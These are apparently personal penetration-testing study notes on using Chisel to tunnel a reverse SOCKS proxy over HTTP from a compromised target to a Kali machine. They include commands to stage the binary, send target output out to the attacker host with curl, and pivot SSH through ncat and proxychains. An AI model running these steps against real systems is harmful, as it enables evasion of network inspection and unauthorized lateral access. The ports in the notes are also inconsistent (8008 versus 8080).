
### Tunneling with Chisel

Chisel is a client/serve tool that we can use to send data using ssh encryption through HTTP. 

We use this when deep packet inspection is in place preventing general reverse shells and ssh connections, but for one reason or another http data is allowed outbound.

We can run a chisel server on our kali machine and transfer a chisel binary to the target machine that we were able to find a vulnerability on through http.

Chisel will bind a SOCKS proxy on the kali machine, and chisel will encapsulate whatever we send through the socks port, ssh encrypted.

Chisel client will then decapsulate the data and send it where ever it needs to go.

`all data trasnferred between chisel server and client is all http formatted allowing us to potentially traverse a deep packet inspection`

`if the target host is running a different operating system or architecture, we have to download and use the compiled binary for that specific operating system and architecture from the Chisel Github releases page`

after starting apache:
```
sudo cp $(which chisel) /var/www/html/
```

wget the chisel binary from the apache server (the correct chisel will need to be used from the releases for the correct system)

read successful attempts at retrieving the chisel binary from the target
```
tail -f /var/log/apache2/access.log
```

monitor our connection with:
```
sudo tcpdump -nvvvXi tun0 tcp port 8080
```

start a chisel server on kali:
```
chisel server --port 8008 --reverse
```

we can then run the chisel command on the remote target (may be saved to a path):
we might not be able to append to /dev/null
```
chisel client kali_ip:8080 R:socks > /dev/null 2>&1 &
```

if we get no output from chisel on attempted exploitation we will need to direct the standard error back to use:
```
/remote/path/to/chisel client kali_ip:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://kali_ip:8080/
```

when all is correct the chisel server on out kali will signify a connection and so will our tcpdump

we can also check out connection with:
```
ss -ntplu
```
there should be a socks connection on port `1080`.

we can now attempt to ssh through our socks proxy:
```
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```

`ncat is used here because nc that ships with kali does not support proxying`

running any other binaries or tools need to go through proxchains:
```
socks5 127.0.0.1 1080
```

and must be configure as shown above.